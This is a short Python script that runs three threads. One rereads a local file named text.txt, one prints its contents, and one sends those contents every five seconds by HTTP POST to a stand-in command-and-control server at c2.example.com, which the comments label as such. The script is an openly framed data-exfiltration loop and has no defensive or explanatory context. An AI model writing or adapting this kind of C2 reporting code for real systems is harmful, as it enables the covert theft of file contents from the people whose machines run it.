import threading
import requests
import time

path = "text.txt"
text = ""

def readFile():
    global path, text
    while True:
        with open("text.txt", "r") as f:
            text = f.read()
        time.sleep(3)

def sendDataToC2():
    global text
    while True:
        try:
            # C2 server URL to send the data
            C2_SERVER_URL = "http://c2.example.com/data_endpoint"

            # Sample data to be sent to C2 server
            data_to_send = {"text": text}

            # Send data to C2 server using HTTP POST request
            response = requests.post(C2_SERVER_URL, json=data_to_send)

            if response.status_code == 200:
                print("Data sent successfully to C2 server.")
            else:
                print(f"Failed to send data to C2 server. Status code: {response.status_code}")

            # Sleep for 5 seconds before sending data again
            time.sleep(5)

        except Exception as e:
            print(f"Error occurred while sending data to C2 server: {e}")

def printloop():
    for x in range(30):
        print(text)
        time.sleep(1)

# Create threads for file reading, printing, and sending data to C2 server
t1 = threading.Thread(target=readFile, daemon=True)
t2 = threading.Thread(target=printloop)
t3 = threading.Thread(target=sendDataToC2, daemon=True)

# Start all threads
t1.start()
t2.start()
t3.start()

# Join all threads to the main thread
t1.join()
t2.join()
t3.join()
